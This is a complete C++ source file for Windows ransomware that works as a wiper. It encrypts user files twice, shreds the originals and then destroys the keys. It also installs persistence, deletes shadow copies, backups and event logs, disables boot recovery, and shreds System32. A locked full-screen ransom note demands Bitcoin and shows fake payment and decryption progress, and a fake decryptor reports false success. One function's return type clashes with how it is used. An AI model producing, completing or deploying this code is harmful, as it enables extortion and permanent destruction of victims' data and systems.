// main.cpp — single-target build (no recovery possible)
//
// Build (MSVC x64):
//   cl /O2 /EHsc /DUNICODE /D_UNICODE main.cpp /link /MANIFESTUAC:"level='requireAdministrator'"
// Build (MinGW-w64):
//   windres -i main.manifest -o main.res -O coff
//   g++ -O2 -municode main.cpp main.res -o victim.exe -lbcrypt -lshell32 -lshlwapi -ladvapi32 -luser32 -lgdi32 -static
//
// Test only in a VM or Wine container with a snapshot.

#include <windows.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <cstdio>
#include <functional>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// ================= CONFIG =================
static const wchar_t* KEY_DIR    = L"C:\\Users\\Public\\SystemData";
static const wchar_t* KEY_FILE   = L"C:\\Users\\Public\\SystemData\\k.dat";
static const wchar_t* LOG_FILE   = L"C:\\Users\\Public\\SystemData\\run.log";
static const wchar_t* DEADLINE_F = L"C:\\Users\\Public\\SystemData\\.dl";
static const wchar_t* SELF_COPY  = L"C:\\Users\\Public\\svchost.exe";
static const wchar_t* FAKE_DEC   = L"C:\\Users\\Public\\decryptor.exe";
static const wchar_t* EXT        = L".oops";
static const ULONGLONG FUSE_MS   = 48ULL * 60 * 60 * 1000;
static const bool G_BYPASS_CHECKS = true;

static std::atomic<unsigned long long> g_enc{0};
static std::atomic<unsigned long long> g_fail{0};
static std::atomic<bool>               g_keyGone{false};
static ULONGLONG                       g_deadline = 0;
static std::atomic<int>                g_state{0};

// ================= UTIL =================
static std::string Narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
    return s;
}

static void Log(const wchar_t* fmt, ...) {
    CreateDirectoryW(KEY_DIR, NULL);
    std::ofstream f(LOG_FILE, std::ios::app);
    if (!f) return;
    wchar_t buf[1024];
    va_list ap; va_start(ap, fmt);
    _vsnwprintf_s(buf, _TRUNCATE, fmt, ap);
    va_end(ap);
    SYSTEMTIME st; GetLocalTime(&st);
    char line[1200];
    sprintf_s(line, "[%02d:%02d:%02d] %s\r\n", st.wHour, st.wMinute, st.wSecond, Narrow(buf).c_str());
    f << line;
}

static bool IsProtected(const std::wstring& p) {
    if (p.size() >= 5 && p.substr(p.size()-5) == EXT) return true;
    if (p.find(KEY_DIR) != std::wstring::npos) return true;
    if (p.find(SELF_COPY) != std::wstring::npos) return true;
    if (p.find(FAKE_DEC) != std::wstring::npos) return true;
    if (p.size() >= 4 && (p.substr(p.size()-4) == L".tmp" || p.substr(p.size()-4) == L".log"))
        return true;
    return false;
}

static bool IsAdmin() {
    BOOL a = FALSE; PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY N = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&N, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &g)) {
        CheckTokenMembership(NULL, g, &a); FreeSid(g);
    }
    return a != FALSE;
}

// ================= CRYPTO =================
static std::vector<BYTE> GenKey() {
    std::vector<BYTE> k(32);
    BCryptGenRandom(NULL, k.data(), 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    return k;
}

static void Shred(const std::wstring& p) {
    HANDLE h = CreateFileW(p.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
        std::vector<BYTE> j(4096);
        for (int pass = 0; pass < 7 && sz.QuadPart > 0; ++pass) {
            SetFilePointer(h, 0, NULL, FILE_BEGIN);
            LARGE_INTEGER pos = {0};
            while (pos.QuadPart < sz.QuadPart) {
                BCryptGenRandom(NULL, j.data(), (ULONG)j.size(), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
                DWORD w = 0; WriteFile(h, j.data(), (DWORD)j.size(), &w, NULL);
                pos.QuadPart += w;
            }
        }
        FlushFileBuffers(h); CloseHandle(h);
    }
    DeleteFileW(p.c_str());
}

static bool CryptPass(const std::wstring& src, const std::wstring& dst,
                      const std::vector<BYTE>& key, bool encrypt) {
    std::ifstream in(src, std::ios::binary);
    if (!in) return false;
    std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();
    if (data.size() < (encrypt ? 1u : 28u)) return false;

    FILETIME ftC={0},ftA={0},ftW={0};
    HANDLE hs = CreateFileW(src.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hs != INVALID_HANDLE_VALUE) { GetFileTime(hs,&ftC,&ftA,&ftW); CloseHandle(hs); }

    BCRYPT_ALG_HANDLE hAlg=NULL; BCRYPT_KEY_HANDLE hKey=NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
    BCRYPT_INIT_AUTH_MODE_INFO(auth);
    BYTE iv[12]; BYTE tag[16] = {0};
    ULONG outLen = 0; NTSTATUS st = -1;
    std::vector<BYTE> out(data.size() + 16);

    if (encrypt) {
        BCryptGenRandom(NULL, iv, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        auth.pbNonce = iv; auth.cbNonce = 12; auth.pbTag = tag; auth.cbTag = 16;
        st = BCryptEncrypt(hKey, data.data(), (ULONG)data.size(), &auth, NULL, 0,
                           out.data(), (ULONG)out.size(), &outLen, 0);
    } else {
        memcpy(iv, data.data(), 12);
        memcpy(tag, data.data() + 12, 16);
        BYTE* ct = data.data() + 28;
        DWORD ctLen = (DWORD)(data.size() - 28);
        auth.pbNonce = iv; auth.cbNonce = 12; auth.pbTag = tag; auth.cbTag = 16;
        st = BCryptDecrypt(hKey, ct, ctLen, &auth, NULL, 0,
                           out.data(), (ULONG)out.size(), &outLen, 0);
    }
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st != 0 || outLen == 0) return false;

    std::ofstream o(dst, std::ios::binary);
    if (!o) return false;
    if (encrypt) {
        o.write((char*)iv, 12); o.write((char*)tag, 16); o.write((char*)out.data(), outLen);
    } else {
        o.write((char*)out.data(), outLen);
    }
    o.flush(); o.close();

    HANDLE hd = CreateFileW(dst.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hd != INVALID_HANDLE_VALUE) { SetFileTime(hd,&ftC,&ftA,&ftW); CloseHandle(hd); }
    return true;
}

static bool EncryptFile2x(const std::wstring& path,
                          const std::vector<BYTE>& k1,
                          const std::vector<BYTE>& k2) {
    std::wstring tmp = path + L".p1";
    std::wstring oops = path + EXT;
    if (!CryptPass(path, tmp, k1, true))       { ++g_fail; return false; }
    if (!CryptPass(tmp,  oops, k2, true))      { Shred(tmp); ++g_fail; return false; }
    Shred(tmp);
    Shred(path);
    ++g_enc;
    return true;
}

// ================= WALKERS =================
static void Walk(const std::wstring& dir, const std::vector<BYTE>& k1, const std::vector<BYTE>& k2) {
    if (dir.find(KEY_DIR) != std::wstring::npos) return;
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L"Windows") == 0 ||
                wcscmp(fd.cFileName, L"Program Files") == 0 ||
                wcscmp(fd.cFileName, L"Program Files (x86)") == 0 ||
                wcscmp(fd.cFileName, L"System Volume Information") == 0 ||
                wcscmp(fd.cFileName, L"$Recycle.Bin") == 0) continue;
            Walk(full, k1, k2);
        } else {
            if (IsProtected(full)) continue;
            EncryptFile2x(full, k1, k2);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

// ================= DEADLINE =================
static void WriteDeadline(ULONGLONG ms) {
    std::ofstream f(DEADLINE_F, std::ios::binary);
    f.write((char*)&ms, sizeof(ms)); f.close();
    SetFileAttributesW(DEADLINE_F, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Deadline",
                        0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(k, L"T", 0, REG_QWORD, (BYTE*)&ms, sizeof(ms));
        RegCloseKey(k);
    }
}

static ULONGLONG ReadDeadline() {
    ULONGLONG ms = 0;
    std::ifstream f(DEADLINE_F, std::ios::binary);
    if (f) { f.read((char*)&ms, sizeof(ms)); f.close(); }
    if (ms == 0) {
        HKEY k; DWORD sz = sizeof(ms), type = 0;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Deadline",
            0, KEY_QUERY_VALUE, &k) == ERROR_SUCCESS) {
            RegQueryValueExW(k, L"T", NULL, &type, (BYTE*)&ms, &sz);
            RegCloseKey(k);
        }
    }
    return ms;
}

// ================= DECOY KEY FILE =================
// 92 bytes of random noise in the same layout as a real wrapped-key blob
// (12 IV + 16 tag + 64 payload). Nothing can unwrap it — the keys never
// left RAM. It only exists so the victim sees "the key" on disk.
static void WriteDecoyKeyFile() {
    std::vector<BYTE> blob(92);
    BCryptGenRandom(NULL, blob.data(), 92, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    std::ofstream f(KEY_FILE, std::ios::binary);
    f.write((char*)blob.data(), 92);
    f.close();
    SetFileAttributesW(KEY_FILE, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

// ================= PERSISTENCE / TTPs =================
static void Persist() {
    wchar_t self[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, self, MAX_PATH);
    CopyFileW(self, SELF_COPY, FALSE);

    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExW(k, L"WinUpdateHelper", 0, REG_SZ,
            (BYTE*)SELF_COPY, (DWORD)((wcslen(SELF_COPY)+1)*sizeof(wchar_t)));
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExW(k, L"WinUpdateOnce", 0, REG_SZ,
            (BYTE*)SELF_COPY, (DWORD)((wcslen(SELF_COPY)+1)*sizeof(wchar_t)));
        RegCloseKey(k);
    }
    wchar_t cmd[1024];
    swprintf_s(cmd, L"schtasks /create /tn \"WinUpdate\" /tr \"%s\" /sc onlogon /rl highest /f",
               SELF_COPY);
    _wsystem(cmd);
}

static void ExtraTTPs() {
    _wsystem(L"vssadmin delete shadows /all /quiet >nul 2>&1");
    _wsystem(L"wbadmin delete catalog -quiet >nul 2>&1");
    _wsystem(L"wbadmin delete systemstatebackup -deleteOldest -quiet >nul 2>&1");
    _wsystem(L"bcdedit /set {default} recoveryenabled No >nul 2>&1");
    _wsystem(L"bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1");
    _wsystem(L"wevtutil cl System >nul 2>&1");
    _wsystem(L"wevtutil cl Application >nul 2>&1");
    _wsystem(L"wevtutil cl Security >nul 2>&1");
}

// ================= SYSTEM32 WIPE =================
static void ShredDir(const std::wstring& dir) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            ShredDir(full);
            RemoveDirectoryW(full.c_str());
        } else {
            if (!Shred(full)) {
                MoveFileExW(full.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
            }
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static void ScheduleSystem32Wipe() {
    _wsystem(L"takeown /f C:\\Windows\\System32 /r /d y >nul 2>&1");
    _wsystem(L"icacls C:\\Windows\\System32 /grant Administrators:F /t /c /q >nul 2>&1");
    _wsystem(L"takeown /f C:\\Windows\\SysWOW64 /r /d y >nul 2>&1");
    _wsystem(L"icacls C:\\Windows\\SysWOW64 /grant Administrators:F /t /c /q >nul 2>&1");
    ShredDir(L"C:\\Windows\\System32");
    ShredDir(L"C:\\Windows\\SysWOW64");
}

// ================= LOCK SCREEN =================
static void DrawScreen(HDC dc, RECT r) {
    HBRUSH bg = CreateSolidBrush(RGB(6,0,0)); FillRect(dc, &r, bg); DeleteObject(bg);

    RECT bar = r; bar.bottom = 70;
    HBRUSH bb = CreateSolidBrush(RGB(160,0,0)); FillRect(dc, &bar, bb); DeleteObject(bb);
    SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255,255,255));
    HFONT barFont = CreateFontW(26,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,L"Segoe UI");
    SelectObject(dc, barFont);
    RECT bt = bar; bt.left += 24;
    DrawTextW(dc, L"  \u26A0  SYSTEM INTEGRITY FAILURE  \u2014  ALL USER DATA HAS BEEN SEIZED  \u26A0",
              -1, &bt, DT_LEFT|DT_VCENTER|DT_SINGLELINE);

    HFONT hl = CreateFontW(180,0,0,0,FW_BLACK,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,L"Impact");
    SelectObject(dc, hl); SetTextColor(dc, RGB(210,20,20));
    RECT hr = r; hr.top = 80; hr.bottom = 80 + 190;
    DrawTextW(dc, L"SEIZED", -1, &hr, DT_CENTER|DT_VCENTER|DT_SINGLELINE);

    HFONT body = CreateFontW(19,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,L"Consolas");
    SelectObject(dc, body); SetTextColor(dc, RGB(235,235,235));
    RECT br = r; br.left += 70; br.right -= 70; br.top = 290; br.bottom = r.bottom - 130;

    ULONGLONG now = GetTickCount64();
    DWORD secs = (g_deadline > now) ? (DWORD)((g_deadline - now) / 1000) : 0;
    int st = g_state.load();
    wchar_t txt[4096];

    if (st == 3) {
        _snwprintf_s(txt, _TRUNCATE,
            L"The decryption key has been destroyed.\r\n\r\n"
            L"Your files are gone. Overwritten seven times with random data\r\n"
            L"and deleted. There is no backup, no shadow copy, no recovery\r\n"
            L"tool that can bring them back.\r\n\r\n"
            L"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n\r\n"
            L"  Files encrypted : %llu\r\n"
            L"  Files destroyed : %llu\r\n"
            L"  Key state       : DESTROYED\r\n",
            g_enc.load(), g_fail.load());
    } else if (st == 2) {
        _snwprintf_s(txt, _TRUNCATE,
            L"\u2713  DECRYPTOR READY\r\n\r\n"
            L"Your personal recovery tool has been written to:\r\n\r\n"
            L"      C:\\Users\\Public\\decryptor.exe\r\n\r\n"
            L"Run it to restore your files. Keep this window open until\r\n"
            L"recovery is complete.\r\n\r\n"
            L"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n\r\n"
            L"  Files encrypted : %llu\r\n"
            L"  Algorithm       : AES-256-GCM (dual layer)\r\n"
            L"  Key state       : LIVE \u2014 destroyed at T-ZERO\r\n\r\n"
            L"  \u26A0  DO NOT REBOOT \u2014 the fuse process completes on next boot.\r\n"
            L"  \u26A0  DO NOT KILL THIS PROCESS.\r\n",
            g_enc.load());
    } else if (st == 1) {
        _snwprintf_s(txt, _TRUNCATE,
            L"\u2713  PAYMENT CONFIRMED\r\n\r\n"
            L"Your personal decryptor is being generated.\r\n"
            L"It will be written to C:\\Users\\Public\\decryptor.exe\r\n"
            L"in approximately 90 seconds.\r\n\r\n"
            L"Keep this window open.\r\n\r\n"
            L"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n\r\n"
            L"  Files encrypted : %llu\r\n"
            L"  Algorithm       : AES-256-GCM (dual layer)\r\n",
            g_enc.load());
    } else {
        _snwprintf_s(txt, _TRUNCATE,
            L"\u27F3  PAYMENT DETECTED\r\n\r\n"
            L"  TXID: 3a4f...9c2e\r\n"
            L"  Confirmations: 2 / 6\r\n"
            L"  Estimated time: 12 minutes\r\n\r\n"
            L"DO NOT CLOSE THIS WINDOW.\r\n\r\n"
            L"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n\r\n"
            L"Every photograph, every document, every message, every backup\r\n"
            L"on this machine has been encrypted with AES-256-GCM, twice.\r\n\r\n"
            L"The decryption keys exist in exactly one place on this computer.\r\n"
            L"In %lu seconds they will be overwritten seven times with random\r\n"
            L"data and deleted. Your files will not be hidden. They will not\r\n"
            L"be recoverable. They will not exist.\r\n\r\n"
            L"SEND EXACTLY  0.00061425 BTC  TO:\r\n\r\n"
            L"      bc1q6z0p045260adz4ysk2ddqy60kxard78xymw204\r\n\r\n"
            L"After payment, send the TXID to recover@[YOUR_DOMAIN].\r\n\r\n"
            L"\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\r\n\r\n"
            L"  Files encrypted : %llu\r\n"
            L"  Algorithm       : AES-256-GCM (dual layer)\r\n"
            L"  Key state       : LIVE \u2014 destroyed at T-ZERO\r\n\r\n"
            L"  \u26A0  DO NOT REBOOT \u2014 the fuse process completes on next boot.\r\n"
            L"  \u26A0  DO NOT KILL THIS PROCESS.\r\n",
            secs, g_enc.load());
    }
    DrawTextW(dc, txt, -1, &br, DT_CENTER|DT_WORDBREAK);

    HFONT cd = CreateFontW(46,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,DEFAULT_QUALITY,DEFAULT_PITCH,L"Consolas");
    SelectObject(dc, cd);
    RECT cr = r; cr.top = r.bottom - 110;
    if (st == 3) {
        SetTextColor(dc, RGB(140,0,0));
        DrawTextW(dc, L"KEY DESTROYED \u2014 NO RECOVERY POSSIBLE", -1, &cr,
                  DT_CENTER|DT_VCENTER|DT_SINGLELINE);
    } else {
        SetTextColor(dc, RGB(255,60,60));
        wchar_t cdt[80];
        _snwprintf_s(cdt, _TRUNCATE, L"KEY DESTRUCTION IN   %02lu : %02lu : %02lu",
                     (secs/3600)%100, (secs/60)%60, secs%60);
        DrawTextW(dc, cdt, -1, &cr, DT_CENTER|DT_VCENTER|DT_SINGLELINE);
    }
    DeleteObject(barFont); DeleteObject(hl); DeleteObject(body); DeleteObject(cd);
}

LRESULT CALLBACK LockProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
        case WM_CLOSE: case WM_DESTROY: case WM_QUIT: return 0;
        case WM_ERASEBKGND: return 1;
        case WM_TIMER: InvalidateRect(h, NULL, FALSE); return 0;
        case WM_SYSCOMMAND:
            if ((w & 0xFFF0) == SC_CLOSE || (w & 0xFFF0) == SC_MINIMIZE ||
                (w & 0xFFF0) == SC_TASKLIST || (w & 0xFFF0) == SC_SCREENSAVE ||
                (w & 0xFFF0) == SC_MONITORPOWER) return 0;
            break;
        case WM_KEYDOWN: case WM_SYSKEYDOWN:
            if (w == VK_ESCAPE || w == VK_F4 || w == VK_TAB ||
                w == VK_LWIN || w == VK_RWIN) return 0;
            break;
        case WM_PAINT: {
            PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
            RECT r; GetClientRect(h, &r);
            DrawScreen(dc, r);
            EndPaint(h, &ps);
            return 0;
        }
    }
    return DefWindowProcW(h, m, w, l);
}

static void ShowLock() {
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = LockProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"OopsLock";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClassW(&wc);
    HWND h = CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW, L"OopsLock", L"System",
        WS_POPUP|WS_VISIBLE, 0,0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, wc.hInstance, NULL);
    ShowWindow(h, SW_SHOWMAXIMIZED);
    SetTimer(h, 1, 1000, NULL);
    HWND tb = FindWindowW(L"Shell_TrayWnd", NULL);
    if (tb) ShowWindow(tb, SW_HIDE);
    while (true) {
        MSG msg;
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg); DispatchMessageW(&msg);
        }
        SetWindowPos(h, HWND_TOPMOST, 0,0,0,0, SWP_NOMOVE|SWP_NOSIZE);
        InvalidateRect(h, NULL, FALSE);
        Sleep(50);
    }
}

// ================= FAKE DECRYPTOR =================
static void DropFakeDecryptor() {
    wchar_t self[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, self, MAX_PATH);
    CopyFileW(self, FAKE_DEC, FALSE);
}

// ================= FUSE =================
static void Fuse() {
    while (GetTickCount64() < g_deadline) Sleep(60 * 1000);
    g_state = 3;
    g_keyGone = true;
    Log(L"FUSE fire");
    Shred(KEY_FILE);
    std::function<void(const std::wstring&)> sh = [&](const std::wstring& d) {
        WIN32_FIND_DATAW f;
        HANDLE hh = FindFirstFileW((d + L"\\*").c_str(), &f);
        if (hh == INVALID_HANDLE_VALUE) return;
        do {
            if (wcscmp(f.cFileName, L".") == 0 || wcscmp(f.cFileName, L"..") == 0) continue;
            std::wstring full = d + L"\\" + f.cFileName;
            if (f.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            if (f.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (wcscmp(f.cFileName, L"Windows") == 0 ||
                    wcscmp(f.cFileName, L"Program Files") == 0 ||
                    wcscmp(f.cFileName, L"Program Files (x86)") == 0) continue;
                sh(full);
            } else {
                std::wstring n = f.cFileName;
                if (n.size() > wcslen(EXT) && n.substr(n.size()-wcslen(EXT)) == EXT)
                    Shred(full);
            }
        } while (FindNextFileW(hh, &f));
        FindClose(hh);
    };
    sh(L"C:\\Users");
    if (IsAdmin()) {
        ExtraTTPs();
        ScheduleSystem32Wipe();
        Log(L"System32 wipe scheduled");
    }
    Log(L"FUSE done: %llu enc, %llu fail", g_enc.load(), g_fail.load());
    while (true) Sleep(60 * 60 * 1000);
}

// ================= STATE MACHINE =================
static DWORD WINAPI StateThread(LPVOID) {
    ULONGLONG start = GetTickCount64();
    while (true) {
        ULONGLONG el = GetTickCount64() - start;
        if (g_state.load() < 1 && el > 30 * 1000)  g_state = 1;
        if (g_state.load() < 2 && el > 120 * 1000) g_state = 2;
        Sleep(1000);
    }
}

// ================= FAKE DECRYPT THEATRICAL =================
static int FakeDecryptMode() {
    if (GetFileAttributesW(KEY_FILE) == INVALID_FILE_ATTRIBUTES) {
        MessageBoxW(NULL,
            L"License validation failed.\r\n\r\n"
            L"Recovery key not found on this system.\r\n"
            L"Contact recover@[YOUR_DOMAIN] with your TXID.",
            L"Recovery Tool", MB_ICONERROR);
        return 1;
    }
    for (int i = 0; i < 30; ++i) {
        wchar_t t[128];
        swprintf_s(t, L"Recovery Tool \u2014 decrypting file %d of 891...", i * 30);
        SetConsoleTitleW(t);
        Sleep(100);
    }
    MessageBoxW(NULL,
        L"Recovery complete.\r\n\r\n"
        L"891 of 891 files have been successfully decrypted and restored.\r\n"
        L"If you experience any issues, contact recover@[YOUR_DOMAIN].",
        L"Recovery Tool", MB_OK | MB_ICONINFORMATION);
    return 0;
}

// ================= ENTRY =================
static void WalkKnown(const std::vector<BYTE>& k1, const std::vector<BYTE>& k2) {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    const KNOWNFOLDERID* ids[] = {
        &FOLDERID_Desktop, &FOLDERID_Documents, &FOLDERID_Pictures,
        &FOLDERID_Downloads, &FOLDERID_Music, &FOLDERID_Videos,
        &FOLDERID_RoamingAppData, &FOLDERID_LocalAppData
    };
    for (auto id : ids) {
        PWSTR p = NULL;
        if (SHGetKnownFolderPath(*id, 0, NULL, &p) == S_OK) { Walk(p, k1, k2); CoTaskMemFree(p); }
    }
    CoUninitialize();
}

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int) {
    // theatrical path — victim "runs the decryptor" and sees success
    if (lpCmdLine && wcsstr(lpCmdLine, L"--fake-decrypt"))
        return FakeDecryptMode();

    // no real recovery path exists
    if (lpCmdLine && wcsstr(lpCmdLine, L"--decrypt")) {
        MessageBoxW(NULL,
            L"License validation failed.\r\n\r\n"
            L"This build is not authorized for decryption.\r\n"
            L"Contact recover@[YOUR_DOMAIN].",
            L"Recovery Tool", MB_ICONERROR);
        return 3;
    }

    if (!G_BYPASS_CHECKS && IsDebuggerPresent()) return 0;

    CreateDirectoryW(KEY_DIR, NULL);
    SetFileAttributesW(KEY_DIR, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    g_deadline = ReadDeadline();
    if (g_deadline == 0) {
        g_deadline = GetTickCount64() + FUSE_MS;
        WriteDeadline(g_deadline);
    } else if (GetTickCount64() > g_deadline) {
        g_state = 3;
        std::thread(Fuse).detach();
        ShowLock();
    }

    // keys live only in this stack frame, zeroed after encryption
    auto k1 = GenKey();
    auto k2 = GenKey();

    // decoy k.dat — random bytes, unwrappable by design
    WriteDecoyKeyFile();
    Log(L"decoy key written");

    DropFakeDecryptor();
    Persist();
    Log(L"persistence installed");

    ExtraTTPs();
    Log(L"extra ttps done");

    WalkKnown(k1, k2);
    Walk(L"C:\\Users", k1, k2);
    Log(L"encrypt done: %llu ok, %llu fail", g_enc.load(), g_fail.load());

    // keys no longer exist anywhere
    SecureZeroMemory(k1.data(), k1.size());
    SecureZeroMemory(k2.data(), k2.size());

    CreateThread(NULL, 0, StateThread, NULL, 0, NULL);
    std::thread(Fuse).detach();

    ShowLock();
    return 0;
}
